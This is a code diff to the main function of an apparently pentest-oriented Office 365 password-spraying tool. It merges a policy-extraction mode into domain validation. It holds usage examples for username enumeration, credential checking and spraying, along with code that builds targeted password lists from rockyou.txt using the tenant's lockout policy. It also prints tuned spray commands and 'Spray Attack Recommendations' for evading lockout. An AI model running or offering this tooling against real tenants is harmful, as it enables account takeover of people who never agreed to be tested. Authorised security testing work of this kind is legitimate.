@@ -2220,14 +2220,14 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Validate domain uses O365 (with full reconnaissance)
+  # Validate domain with full recon and policy extraction
   python3 o365_spray.py --validate -d target.com -o recon_report -v
 
-  # Extract password policy and generate targeted list
-  python3 o365_spray.py --get-policy -d target.com -o spray_list
+  # Validate and generate targeted password list
+  python3 o365_spray.py --validate -d target.com -o recon --generate-passwords
 
-  # Generate from custom dictionary
-  python3 o365_spray.py --get-policy -d target.com -o spray_list -p /path/to/dict.txt --max-passwords 500
+  # Use custom dictionary for password generation
+  python3 o365_spray.py --validate -d target.com -o recon --generate-passwords -p /custom/dict.txt
 
   # Enumerate valid users
   python3 o365_spray.py --enum -u users.txt -d target.com -o valid_users.txt
@@ -2235,41 +2235,35 @@ Examples:
   # Validate credentials from file
   python3 o365_spray.py --check-creds -c creds.txt -o valid_creds.txt
 
-  # Password spray (with progress tracking)
-  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o compromised.txt
+  # Password spray with progress tracking
+  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o results.txt
 
   # Resume interrupted spray
-  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o compromised.txt --resume
+  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o results.txt
         """
     )
 
     # Mode selection
     mode = parser.add_mutually_exclusive_group(required=True)
-    mode.add_argument('--validate', action='store_true', help='Validate if domain uses O365 (includes full recon)')
-    mode.add_argument('--get-policy', action='store_true', help='Extract password policy and generate targeted list')
+    mode.add_argument('--validate', action='store_true', help='Validate if domain uses O365 (includes full recon + policy)')
     mode.add_argument('--enum', action='store_true', help='Username enumeration mode')
     mode.add_argument('--check-creds', action='store_true', help='Credential validation mode')
     mode.add_argument('--spray', action='store_true', help='Password spraying mode')
 
     # Input files
     parser.add_argument('-u', '--usernames', help='File containing usernames (one per line)')
-    parser.add_argument('-p', '--passwords', help='File containing passwords (one per line) or source dictionary for filtering')
+    parser.add_argument('-p', '--passwords', help='File containing passwords or source dictionary for filtering')
     parser.add_argument('-P', '--password', help='Single password to test')
     parser.add_argument('-c', '--credentials', help='File with username:password format')
     parser.add_argument('-d', '--domain', help='Domain for validation/enumeration (e.g., target.com)')
-    # Password policy options
-    parser.add_argument('--generate-passwords', action='store_true',
-                       help='Generate targeted password list based on policy (use with --validate)')
-    parser.add_argument('--max-passwords', type=int, default=1000,
-                       help='Maximum passwords to extract from dictionary (default: 1000)')
-    parser.add_argument('--smart-only', action='store_true',
-                       help='Only use smart targeted passwords, skip dictionary filtering')
 
     # Enumeration options
     parser.add_argument('--method', choices=['office', 'activesync', 'onedrive'],
                        default='office', help='Enumeration method (default: office)')
 
-    # Password policy options
+    # Password policy and generation options
+    parser.add_argument('--generate-passwords', action='store_true',
+                       help='Generate targeted password list based on policy (use with --validate)')
     parser.add_argument('--max-passwords', type=int, default=1000,
                        help='Maximum passwords to extract from dictionary (default: 1000)')
     parser.add_argument('--smart-only', action='store_true',
@@ -2285,7 +2279,7 @@ Examples:
     parser.add_argument('--delay-user-max', type=int, default=5,
                        help='Max seconds between users (default: 5)')
     parser.add_argument('--resume', action='store_true',
-                       help='Resume from previous spray progress (default: True)')
+                       help='Resume from previous spray progress (default behavior)')
     parser.add_argument('--no-resume', action='store_true',
                        help='Start fresh spray, ignore previous progress')
 
@@ -2297,298 +2291,28 @@ Examples:
 
     args = parser.parse_args()
 
-    # Validation mode - Check if domain uses O365 with full reconnaissance
-        if args.validate:
-            if not args.domain:
-                parser.error("--validate requires -d/--domain")
-
-            validator = O365DomainValidator(verbose=args.verbose)
-            results = validator.validate_domain(args.domain)
-
-            # Generate password list if requested
-            if args.generate_passwords and results.get('password_policy', {}).get('policy'):
-                print("\n" + "="*60)
-                print("GENERATING TARGETED PASSWORD LIST")
-                print("="*60)
-
-                policy = results['password_policy']['policy']
-
-                # Determine output filename
-                if args.output:
-                    password_file = args.output.replace('.json', '_passwords.txt').replace('_summary.txt', '_passwords.txt')
-                    if not password_file.endswith('_passwords.txt'):
-                        password_file = f"{args.output}_passwords.txt"
-                else:
-                    password_file = f"{args.domain.split('.')[0]}_passwords.txt"
-
-                # Determine source dictionary
-                source_dict = args.passwords if args.passwords else '/vapt/passwords/rockyou.txt'
-
-                passwords = generate_password_list(
-                    policy,
-                    password_file,
-                    source_dict=source_dict,
-                    max_passwords=args.max_passwords,
-                    smart_only=args.smart_only
-                )
-
-                recommendations = results['password_policy'].get('recommendations', {})
-
-                print(f"\n[+] Ready to spray with optimized parameters:")
-                print(f"    python o365_spray.py --spray \\")
-                print(f"        -u users.txt \\")
-                print(f"        -p {password_file} \\")
-                print(f"        --count {recommendations.get('attempts_per_round', 1)} \\")
-                print(f"        --delay {recommendations.get('delay_between_rounds', 30)} \\")
-                print(f"        -o results.txt")
-
-            # Save results to JSON and summary
-            if args.output:
-                # Save JSON report
-                json_file = args.output if args.output.endswith('.json') else f"{args.output}.json"
-                try:
-                    with open(json_file, 'w') as f:
-                        json.dump(results, f, indent=2)
-                    print(f"\n[+] JSON report saved to: {json_file}")
-                except Exception as e:
-                    print(f"\n[-] Error saving JSON report: {e}")
-
-                # Also save a human-readable summary
-                txt_file = json_file.replace('.json', '_summary.txt')
-                try:
-                    with open(txt_file, 'w') as f:
-                        f.write(f"O365 Validation Report: {results['domain']}\n")
-                        f.write(f"{'='*60}\n")
-                        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                        f.write(f"{'='*60}\n\n")
-
-                        f.write(f"Uses O365: {results['is_o365']}\n")
-                        f.write(f"Tenant ID: {results.get('tenant_id', 'N/A')}\n\n")
-
-                        f.write("BASIC CHECKS:\n")
-                        f.write("-" * 60 + "\n")
-                        for check_name, check_data in results['checks'].items():
-                            f.write(f"\n{check_name.upper()}:\n")
-                            f.write(f"  Valid: {check_data.get('valid')}\n")
-                            if 'message' in check_data:
-                                f.write(f"  Message: {check_data['message']}\n")
-                            if 'details' in check_data and check_data['details']:
-                                f.write(f"  Details:\n")
-                                for key, value in check_data['details'].items():
-                                    f.write(f"    {key}: {value}\n")
-
-                        if 'reconnaissance' in results and results['reconnaissance']:
-                            f.write(f"\n\n{'='*60}\n")
-                            f.write("EXTENDED RECONNAISSANCE\n")
-                            f.write(f"{'='*60}\n")
-
-                            # Tenant Details
-                            if 'tenant_details' in results['reconnaissance']:
-                                tenant = results['reconnaissance']['tenant_details']
-                                if 'openid_v2' in tenant:
-                                    f.write("\nTenant Configuration:\n")
-                                    f.write("-" * 40 + "\n")
-                                    for key, value in tenant['openid_v2'].items():
-                                        if value:
-                                            f.write(f"  {key}: {value}\n")
-
-                            # Associated Domains
-                            if 'associated_domains' in results['reconnaissance']:
-                                domains = results['reconnaissance']['associated_domains']
-                                if isinstance(domains, list):
-                                    f.write(f"\nAssociated Domains ({len(domains)}):\n")
-                                    f.write("-" * 40 + "\n")
-                                    for d in domains:
-                                        f.write(f"  - {d}\n")
-
-                            # Applications
-                            if 'applications' in results['reconnaissance']:
-                                apps = results['reconnaissance']['applications']
-                                if isinstance(apps, dict):
-                                    f.write(f"\nAccessible Applications: {apps.get('total_accessible', 0)}\n")
-                                    f.write("-" * 40 + "\n")
-
-                                    if apps.get('known_apps'):
-                                        f.write("\nKnown Microsoft Applications:\n")
-                                        for app in apps['known_apps']:
-                                            f.write(f"  - {app['name']}\n")
-                                            f.write(f"    Client ID: {app['client_id']}\n")
-
-                                    if apps.get('custom_apps'):
-                                        f.write(f"\nPotential Custom Applications: {len(apps['custom_apps'])}\n")
-                                        for app in apps['custom_apps'][:10]:  # Top 10
-                                            f.write(f"  - {app.get('potential_redirect_uri', 'Unknown')}\n")
-
-                            # Username Patterns
-                            if 'username_patterns' in results['reconnaissance']:
-                                patterns_data = results['reconnaissance']['username_patterns']
-                                if isinstance(patterns_data, dict):
-                                    patterns = patterns_data.get('patterns', [])
-                                    f.write(f"\nUsername Format Patterns ({len(patterns)} discovered):\n")
-                                    f.write("-" * 40 + "\n")
-                                    if patterns:
-                                        for p in patterns[:10]:  # Top 10
-                                            f.write(f"  - {p['pattern']}: {p['confidence']}% confidence ")
-                                            f.write(f"({p['matches']}/{p['attempts']} matches)\n")
-                                    else:
-                                        f.write("  No patterns discovered with test names\n")
-
-                            # Guest Access
-                            if 'guest_access' in results['reconnaissance']:
-                                guest = results['reconnaissance']['guest_access']
-                                if isinstance(guest, dict):
-                                    f.write("\nGuest Access & Misconfigurations:\n")
-                                    f.write("-" * 40 + "\n")
-                                    f.write(f"  Guest Users Allowed: {guest.get('guest_users_allowed', False)}\n")
-
-                                    if guest.get('external_domains_found'):
-                                        f.write(f"  External Domains Found: {len(guest['external_domains_found'])}\n")
-                                        for domain in guest['external_domains_found']:
-                                            f.write(f"    - {domain}\n")
-
-                                    if guest.get('oauth_misconfigurations'):
-                                        f.write(f"  OAuth Misconfigurations: {len(guest['oauth_misconfigurations'])}\n")
-                                        for misconfig in guest['oauth_misconfigurations']:
-                                            f.write(f"    - {misconfig.get('type', 'Unknown')}: ")
-                                            f.write(f"{misconfig.get('description', 'N/A')} ")
-                                            f.write(f"(Risk: {misconfig.get('risk', 'unknown')})\n")
-
-                        # Password Policy Section (NEW)
-                        if 'password_policy' in results and 'policy' in results['password_policy']:
-                            f.write(f"\n\n{'='*60}\n")
-                            f.write("PASSWORD POLICY ANALYSIS\n")
-                            f.write(f"{'='*60}\n")
-
-                            policy = results['password_policy']['policy']
-                            recommendations = results['password_policy'].get('recommendations', {})
-
-                            f.write("\nPassword Requirements:\n")
-                            f.write("-" * 40 + "\n")
-                            if policy.get('password_requirements'):
-                                req = policy['password_requirements']
-                                f.write(f"  Minimum Length: {req.get('min_length', 8)} characters\n")
-                                f.write(f"  Maximum Length: {req.get('max_length', 256)} characters\n")
-
-                                if req.get('guidance'):
-                                    guidance = req['guidance']
-                                    f.write(f"  Recommendation: {guidance.get('recommendation', 'N/A')}\n")
-                                    f.write(f"  Banned List: {guidance.get('banned_list', 'N/A')}\n")
-
-                            f.write("\nLockout Policy:\n")
-                            f.write("-" * 40 + "\n")
-                            if policy.get('lockout_policy'):
-                                lockout = policy['lockout_policy']
-                                f.write(f"  Threshold: {lockout.get('estimated_threshold', 'Unknown')} attempts\n")
-                                f.write(f"  Duration: {lockout.get('lockout_duration', 'Unknown')}\n")
-                                if lockout.get('notes'):
-                                    f.write(f"  Notes: {lockout['notes']}\n")
-
-                            if policy.get('smart_lockout', {}).get('enabled'):
-                                f.write("\nSmart Lockout: ENABLED\n")
-                                f.write("-" * 40 + "\n")
-                                smart = policy['smart_lockout']
-                                if smart.get('features'):
-                                    f.write("  Features:\n")
-                                    for feature in smart['features']:
-                                        f.write(f"    - {feature}\n")
-
-                            if policy.get('mfa_status', {}).get('enforced'):
-                                f.write("\n⚠ MFA: ENFORCED\n")
-                                f.write("-" * 40 + "\n")
-                                f.write("  Valid credentials may still require MFA\n")
-
-                            f.write("\nSpray Attack Recommendations:\n")
-                            f.write("-" * 40 + "\n")
-                            if recommendations:
-                                f.write(f"  Delay Between Rounds: {recommendations.get('delay_between_rounds', 30)} minutes\n")
-                                f.write(f"  Attempts Per Round: {recommendations.get('attempts_per_round', 1)}\n")
-                                f.write(f"  Delay Between Users: {recommendations.get('delay_between_users', 5)} seconds\n")
-
-                                if recommendations.get('risk_assessment'):
-                                    f.write("\n  Risk Assessment:\n")
-                                    for key, value in recommendations['risk_assessment'].items():
-                                        f.write(f"    {key.replace('_', ' ').title()}: {value}\n")
-
-                        f.write(f"\n{'='*60}\n")
-                        f.write("END OF REPORT\n")
-                        f.write(f"{'='*60}\n")
-
-                    print(f"[+] Summary report saved to: {txt_file}")
-                except Exception as e:
-                    print(f"\n[-] Error saving summary report: {e}")
-
-            # Exit with appropriate code
-            sys.exit(0 if results['is_o365'] else 1)
-
-    # Get password policy mode
-    elif args.get_policy:
+    # Validation mode - Check if domain uses O365 with full reconnaissance and policy
+    if args.validate:
         if not args.domain:
-            parser.error("--get-policy requires -d/--domain")
+            parser.error("--validate requires -d/--domain")
 
-        # First, get tenant ID
-        print("[*] Getting tenant information...")
-        validator = O365DomainValidator(verbose=False)
-        openid_valid, openid_msg, tenant_id = validator.check_openid_config(args.domain)
+        validator = O365DomainValidator(verbose=args.verbose)
+        results = validator.validate_domain(args.domain)
 
-        if not tenant_id:
-            print("[-] Could not retrieve tenant ID")
-            sys.exit(1)
+        # Generate password list if requested
+        if args.generate_passwords and results.get('password_policy', {}).get('policy'):
+            print("\n" + "="*60)
+            print("GENERATING TARGETED PASSWORD LIST")
+            print("="*60)
 
-        print(f"[+] Tenant ID: {tenant_id}\n")
+            policy = results['password_policy']['policy']
 
-        # Extract policy
-        policy_checker = O365PasswordPolicy(verbose=args.verbose)
-        policy = policy_checker.get_password_policy(args.domain, tenant_id)
-
-        # Generate recommendations
-        recommendations = policy_checker.generate_spray_recommendations(policy)
-
-        # Display results
-        print("\n" + "="*60)
-        print("PASSWORD POLICY ANALYSIS")
-        print("="*60)
-
-        print(f"\nPassword Requirements:")
-        print(f"  - Minimum Length: {policy['password_requirements'].get('min_length', 8)} characters")
-        print(f"  - Maximum Length: {policy['password_requirements'].get('max_length', 256)} characters")
-
-        if policy['password_requirements'].get('guidance'):
-            guidance = policy['password_requirements']['guidance']
-            print(f"  - Guidance: {guidance.get('recommendation')}")
-            print(f"  - Banned List: {guidance.get('banned_list')}")
-
-        print(f"\nLockout Policy:")
-        lockout = policy['lockout_policy']
-        print(f"  - Estimated Threshold: {lockout.get('estimated_threshold', 'Unknown')} attempts")
-        print(f"  - Lockout Duration: {lockout.get('lockout_duration', 'Unknown')}")
-
-        if policy.get('smart_lockout', {}).get('enabled'):
-            print(f"\nSmart Lockout: ENABLED")
-            print(f"  - Type: Cloud-based intelligent lockout")
-            print(f"  - Features:")
-            for feature in policy['smart_lockout'].get('features', [])[:4]:
-                print(f"    • {feature}")
-
-        if policy.get('mfa_status', {}).get('enforced'):
-            print(f"\n⚠ MFA Status: ENFORCED")
-            print(f"  - Valid credentials may still require MFA")
-
-        print(f"\n" + "="*60)
-        print("SPRAY ATTACK RECOMMENDATIONS")
-        print("="*60)
-
-        print(f"\nOptimal Spray Parameters:")
-        print(f"  - Delay Between Rounds: {recommendations['delay_between_rounds']} minutes")
-        print(f"  - Attempts Per Round: {recommendations['attempts_per_round']}")
-        print(f"  - Delay Between Users: {recommendations['delay_between_users']} seconds")
-
-        print(f"\nRisk Assessment:")
-        for key, value in recommendations['risk_assessment'].items():
-            print(f"  - {key.replace('_', ' ').title()}: {value}")
-
-        # Generate password list
-        if args.output:
-            password_file = args.output if args.output.endswith('.txt') else f"{args.output}.txt"
+            # Determine output filename
+            if args.output:
+                base_output = args.output.replace('.json', '').replace('_summary.txt', '').replace('_summary', '')
+                password_file = f"{base_output}_passwords.txt"
+            else:
+                password_file = f"{args.domain.split('.')[0]}_passwords.txt"
 
             # Determine source dictionary
             source_dict = args.passwords if args.passwords else '/vapt/passwords/rockyou.txt'
@@ -2601,24 +2325,206 @@ Examples:
                 smart_only=args.smart_only
             )
 
-            print(f"\n[+] Use generated passwords:")
-            print(f"    python o365_spray.py --spray -u users.txt -p {password_file} --count {recommendations['attempts_per_round']} --delay {recommendations['delay_between_rounds']}")
-        else:
-            print(f"\n💡 Use -o <filename> to generate a targeted password list")
+            recommendations = results['password_policy'].get('recommendations', {})
 
-        # Save full policy to JSON
+            print(f"\n[+] Ready to spray with optimized parameters:")
+            print(f"    python o365_spray.py --spray \\")
+            print(f"        -u users.txt \\")
+            print(f"        -p {password_file} \\")
+            print(f"        --count {recommendations.get('attempts_per_round', 1)} \\")
+            print(f"        --delay {recommendations.get('delay_between_rounds', 30)} \\")
+            print(f"        -o results.txt")
+
+        # Save results to JSON and summary
         if args.output:
-            json_file = args.output.replace('.txt', '_policy.json')
+            # Save JSON report
+            json_file = args.output if args.output.endswith('.json') else f"{args.output}.json"
             try:
                 with open(json_file, 'w') as f:
-                    full_report = {
-                        'policy': policy,
-                        'recommendations': recommendations
-                    }
-                    json.dump(full_report, f, indent=2)
-                print(f"[+] Full policy analysis saved to: {json_file}")
+                    json.dump(results, f, indent=2)
+                print(f"\n[+] JSON report saved to: {json_file}")
             except Exception as e:
-                print(f"[-] Error saving policy: {e}")
+                print(f"\n[-] Error saving JSON report: {e}")
+
+            # Also save a human-readable summary
+            txt_file = json_file.replace('.json', '_summary.txt')
+            try:
+                with open(txt_file, 'w') as f:
+                    f.write(f"O365 Validation Report: {results['domain']}\n")
+                    f.write(f"{'='*60}\n")
+                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"{'='*60}\n\n")
+
+                    f.write(f"Uses O365: {results['is_o365']}\n")
+                    f.write(f"Tenant ID: {results.get('tenant_id', 'N/A')}\n\n")
+
+                    f.write("BASIC CHECKS:\n")
+                    f.write("-" * 60 + "\n")
+                    for check_name, check_data in results['checks'].items():
+                        f.write(f"\n{check_name.upper()}:\n")
+                        f.write(f"  Valid: {check_data.get('valid')}\n")
+                        if 'message' in check_data:
+                            f.write(f"  Message: {check_data['message']}\n")
+                        if 'details' in check_data and check_data['details']:
+                            f.write(f"  Details:\n")
+                            for key, value in check_data['details'].items():
+                                f.write(f"    {key}: {value}\n")
+
+                    if 'reconnaissance' in results and results['reconnaissance']:
+                        f.write(f"\n\n{'='*60}\n")
+                        f.write("EXTENDED RECONNAISSANCE\n")
+                        f.write(f"{'='*60}\n")
+
+                        # Tenant Details
+                        if 'tenant_details' in results['reconnaissance']:
+                            tenant = results['reconnaissance']['tenant_details']
+                            if 'openid_v2' in tenant:
+                                f.write("\nTenant Configuration:\n")
+                                f.write("-" * 40 + "\n")
+                                for key, value in tenant['openid_v2'].items():
+                                    if value:
+                                        f.write(f"  {key}: {value}\n")
+
+                        # Associated Domains
+                        if 'associated_domains' in results['reconnaissance']:
+                            domains = results['reconnaissance']['associated_domains']
+                            if isinstance(domains, list):
+                                f.write(f"\nAssociated Domains ({len(domains)}):\n")
+                                f.write("-" * 40 + "\n")
+                                for d in domains:
+                                    f.write(f"  - {d}\n")
+
+                        # Applications
+                        if 'applications' in results['reconnaissance']:
+                            apps = results['reconnaissance']['applications']
+                            if isinstance(apps, dict):
+                                f.write(f"\nAccessible Applications: {apps.get('total_accessible', 0)}\n")
+                                f.write("-" * 40 + "\n")
+
+                                if apps.get('known_apps'):
+                                    f.write("\nKnown Microsoft Applications:\n")
+                                    for app in apps['known_apps']:
+                                        f.write(f"  - {app['name']}\n")
+                                        f.write(f"    Client ID: {app['client_id']}\n")
+
+                                if apps.get('custom_apps'):
+                                    f.write(f"\nPotential Custom Applications: {len(apps['custom_apps'])}\n")
+                                    for app in apps['custom_apps'][:10]:  # Top 10
+                                        f.write(f"  - {app.get('potential_redirect_uri', 'Unknown')}\n")
+
+                        # Username Patterns
+                        if 'username_patterns' in results['reconnaissance']:
+                            patterns_data = results['reconnaissance']['username_patterns']
+                            if isinstance(patterns_data, dict):
+                                patterns = patterns_data.get('patterns', [])
+                                f.write(f"\nUsername Format Patterns ({len(patterns)} discovered):\n")
+                                f.write("-" * 40 + "\n")
+                                if patterns:
+                                    for p in patterns[:10]:  # Top 10
+                                        f.write(f"  - {p['pattern']}: {p['confidence']}% confidence ")
+                                        f.write(f"({p['matches']}/{p['attempts']} matches)\n")
+                                else:
+                                    f.write("  No patterns discovered with test names\n")
+
+                        # Guest Access
+                        if 'guest_access' in results['reconnaissance']:
+                            guest = results['reconnaissance']['guest_access']
+                            if isinstance(guest, dict):
+                                f.write("\nGuest Access & Misconfigurations:\n")
+                                f.write("-" * 40 + "\n")
+                                f.write(f"  Guest Users Allowed: {guest.get('guest_users_allowed', False)}\n")
+
+                                if guest.get('external_domains_found'):
+                                    f.write(f"  External Domains Found: {len(guest['external_domains_found'])}\n")
+                                    for domain in guest['external_domains_found']:
+                                        f.write(f"    - {domain}\n")
+
+                                if guest.get('oauth_misconfigurations'):
+                                    f.write(f"  OAuth Misconfigurations: {len(guest['oauth_misconfigurations'])}\n")
+                                    for misconfig in guest['oauth_misconfigurations']:
+                                        f.write(f"    - {misconfig.get('type', 'Unknown')}: ")
+                                        f.write(f"{misconfig.get('description', 'N/A')} ")
+                                        f.write(f"(Risk: {misconfig.get('risk', 'unknown')})\n")
+
+                    # Password Policy Section
+                    if 'password_policy' in results and 'policy' in results['password_policy']:
+                        f.write(f"\n\n{'='*60}\n")
+                        f.write("PASSWORD POLICY ANALYSIS\n")
+                        f.write(f"{'='*60}\n")
+
+                        policy = results['password_policy']['policy']
+                        recommendations = results['password_policy'].get('recommendations', {})
+
+                        f.write("\nPassword Requirements:\n")
+                        f.write("-" * 40 + "\n")
+                        if policy.get('password_requirements'):
+                            req = policy['password_requirements']
+                            f.write(f"  Minimum Length: {req.get('min_length', 8)} characters\n")
+                            f.write(f"  Maximum Length: {req.get('max_length', 256)} characters\n")
+
+                            if req.get('guidance'):
+                                guidance = req['guidance']
+                                f.write(f"  Recommendation: {guidance.get('recommendation', 'N/A')}\n")
+                                f.write(f"  Banned List: {guidance.get('banned_list', 'N/A')}\n")
+
+                        f.write("\nLockout Policy:\n")
+                        f.write("-" * 40 + "\n")
+                        if policy.get('lockout_policy'):
+                            lockout = policy['lockout_policy']
+                            f.write(f"  Threshold: {lockout.get('estimated_threshold', 'Unknown')} attempts\n")
+                            f.write(f"  Duration: {lockout.get('lockout_duration', 'Unknown')}\n")
+                            if lockout.get('notes'):
+                                f.write(f"  Notes: {lockout['notes']}\n")
+
+                        if policy.get('smart_lockout', {}).get('enabled'):
+                            f.write("\nSmart Lockout: ENABLED\n")
+                            f.write("-" * 40 + "\n")
+                            smart = policy['smart_lockout']
+                            if smart.get('features'):
+                                f.write("  Features:\n")
+                                for feature in smart['features']:
+                                    f.write(f"    - {feature}\n")
+
+                            if smart.get('recommendations'):
+                                f.write("  Recommendations:\n")
+                                for rec in smart['recommendations']:
+                                    f.write(f"    - {rec}\n")
+
+                        if policy.get('mfa_status', {}).get('enforced'):
+                            f.write("\n⚠ MFA: ENFORCED\n")
+                            f.write("-" * 40 + "\n")
+                            f.write("  Valid credentials may still require MFA\n")
+
+                        f.write("\nSpray Attack Recommendations:\n")
+                        f.write("-" * 40 + "\n")
+                        if recommendations:
+                            f.write(f"  Delay Between Rounds: {recommendations.get('delay_between_rounds', 30)} minutes\n")
+                            f.write(f"  Attempts Per Round: {recommendations.get('attempts_per_round', 1)}\n")
+                            f.write(f"  Delay Between Users: {recommendations.get('delay_between_users', 5)} seconds\n")
+
+                            if recommendations.get('risk_assessment'):
+                                f.write("\n  Risk Assessment:\n")
+                                for key, value in recommendations['risk_assessment'].items():
+                                    f.write(f"    {key.replace('_', ' ').title()}: {value}\n")
+
+                            if recommendations.get('password_requirements', {}).get('recommended_patterns'):
+                                patterns = recommendations['password_requirements']['recommended_patterns']
+                                f.write(f"\n  Recommended Password Patterns ({len(patterns)}):\n")
+                                for pattern in patterns[:15]:  # Top 15
+                                    f.write(f"    - {pattern}\n")
+                                if len(patterns) > 15:
+                                    f.write(f"    ... and {len(patterns) - 15} more\n")
+
+                    f.write(f"\n{'='*60}\n")
+                    f.write("END OF REPORT\n")
+                    f.write(f"{'='*60}\n")
+
+                print(f"[+] Summary report saved to: {txt_file}")
+            except Exception as e:
+                print(f"\n[-] Error saving summary report: {e}")
+
+        # Exit with appropriate code
+        sys.exit(0 if results['is_o365'] else 1)
 
     # Enumeration mode
     elif args.enum:
